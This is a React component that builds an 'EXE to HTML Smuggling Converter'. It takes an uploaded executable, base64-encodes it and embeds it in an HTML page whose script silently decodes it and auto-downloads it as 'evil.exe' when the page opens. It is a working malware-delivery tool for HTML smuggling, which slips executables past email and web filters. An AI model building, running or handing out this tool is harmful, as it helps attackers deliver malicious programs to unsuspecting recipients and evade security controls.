import React, { useState } from 'react';
import { Button } from "/components/ui/button";
import { Input } from "/components/ui/input";
import { Upload, Download } from "lucide-react";

function App() {
  const [file, setFile] = useState(null);
  const [encodedText, setEncodedText] = useState('');
  const [isUploading, setIsUploading] = useState(false);
  const [isConverting, setIsConverting] = useState(false);
  const [html, setHtml] = useState('');

  const handleFileChange = (e) => {
    setFile(e.target.files[0]);
  };

  const handleUpload = () => {
    setIsUploading(true);
    const reader = new FileReader();
    reader.onload = () => {
      setIsUploading(false);
      setIsConverting(true);
      const encoded = btoa(reader.result);
      setEncodedText(encoded);
      const htmlTemplate = `<!-- code from https://outflank.nl/blog/2018/08/14/html-smuggling-explained/ -->
<html>
  <body>
    <p>Hello world ! salah inside </p>
    <script>
      function base64ToArrayBuffer(base64) {
        var binary_string = window.atob(base64);
        var len = binary_string.length;
        var bytes = new Uint8Array( len );
        for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
        return bytes.buffer;
      }
      var file = '${encoded}';
      var data = base64ToArrayBuffer(file);
      var blob = new Blob([data], {type: 'octet/stream'});
      var fileName = 'evil.exe';
      if (window.navigator.msSaveOrOpenBlob) {
        window.navigator.msSaveOrOpenBlob(blob,fileName);
      } else {
        var a = document.createElement('a');
        console.log(a);
        document.body.appendChild(a);
        a.style = 'display: none';
        var url = window.URL.createObjectURL(blob);
        a.href = url;
        a.download = fileName;
        a.click();
        window.URL.revokeObjectURL(url);
      }
    </script>
  </body>
</html>`;
      setHtml(htmlTemplate);
      setIsConverting(false);
    };
    reader.readAsBinaryString(file);
  };

  const handleDownloadHtml = () => {
    const link = document.createElement('a');
    link.href = `data:text/html;charset=utf-8,${html}`;
    link.download = 'html_smuggling.html';
    link.click();
  };

  return (
    <div className="max-w-md mx-auto p-4 mt-12 bg-white rounded-lg shadow-md">
      <h2 className="text-lg font-bold mb-4">EXE to HTML Smuggling Converter</h2>
      <div className="flex items-center mb-4">
        <input
          type="file"
          onChange={handleFileChange}
          accept=".exe"
          className="block w-full"
        />
        {file && (
          <span className="ml-2">{file.name}</span>
        )}
      </div>
      <Button onClick={handleUpload} className="mb-4" disabled={isUploading || isConverting}>
        {isUploading ? 'Uploading...' : isConverting ? 'Converting...' : 'Upload and Convert'}
      </Button>
      {html && (
        <div className="flex items-center mb-4">
          <Button variant="secondary" onClick={handleDownloadHtml}>
            <Download className="mr-2" />
            Download HTML File
          </Button>
        </div>
      )}
    </div>
  );
}

export default App;